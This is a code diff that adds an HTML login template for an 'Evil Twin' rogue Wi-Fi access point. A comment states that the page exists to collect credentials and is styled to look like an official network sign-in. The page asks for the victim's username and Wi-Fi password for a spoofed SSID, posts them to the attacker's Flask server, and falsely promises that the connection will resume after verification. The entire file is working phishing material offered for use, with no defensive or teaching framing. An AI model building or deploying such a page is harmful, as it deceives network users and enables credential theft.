@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<!--
+  Generic captive-portal login page used by the Evil Twin to collect credentials.
+  Intentionally plain and "official looking" so it reads as a normal network sign-in.
+  The {{ ssid }} / {{ error }} placeholders are filled by the Flask server.
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in to {{ ssid }}</title>
+  <style>
+    :root { --accent:#1a73e8; }
+    * { box-sizing: border-box; }
+    body {
+      margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+      background:#f1f3f4; color:#202124; display:flex; min-height:100vh;
+      align-items:center; justify-content:center;
+    }
+    .card {
+      background:#fff; width:100%; max-width:380px; margin:16px; padding:32px 28px;
+      border-radius:12px; box-shadow:0 1px 3px rgba(0,0,0,.2);
+    }
+    .logo { width:48px; height:48px; border-radius:50%; background:var(--accent);
+            margin:0 auto 16px; display:flex; align-items:center; justify-content:center;
+            color:#fff; font-size:24px; }
+    h1 { font-size:20px; font-weight:500; text-align:center; margin:0 0 4px; }
+    p.sub { text-align:center; color:#5f6368; font-size:14px; margin:0 0 24px; }
+    label { display:block; font-size:13px; color:#5f6368; margin:14px 0 4px; }
+    input { width:100%; padding:12px 14px; font-size:15px; border:1px solid #dadce0;
+            border-radius:6px; outline:none; }
+    input:focus { border-color:var(--accent); }
+    button { width:100%; margin-top:22px; padding:12px; font-size:15px; font-weight:500;
+             color:#fff; background:var(--accent); border:none; border-radius:6px;
+             cursor:pointer; }
+    .err { background:#fce8e6; color:#c5221f; font-size:13px; padding:10px 12px;
+           border-radius:6px; margin-bottom:12px; }
+    .foot { text-align:center; color:#9aa0a6; font-size:12px; margin-top:22px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">&#128274;</div>
+    <h1>Sign in to {{ ssid }}</h1>
+    <p class="sub">Authentication is required to access this network.</p>
+
+    {% if error %}<div class="err">{{ error }}</div>{% endif %}
+
+    <form method="POST" action="/login">
+      <label for="username">Username</label>
+      <input id="username" name="username" type="text" autocomplete="username"
+             placeholder="Network username" required autofocus>
+
+      <label for="password">Network password</label>
+      <input id="password" name="password" type="password" autocomplete="current-password"
+             placeholder="Wi-Fi password" required>
+
+      <button type="submit">Connect</button>
+    </form>
+
+    <div class="foot">Your connection to {{ ssid }} will resume after verification.</div>
+  </div>
+</body>
+</html>
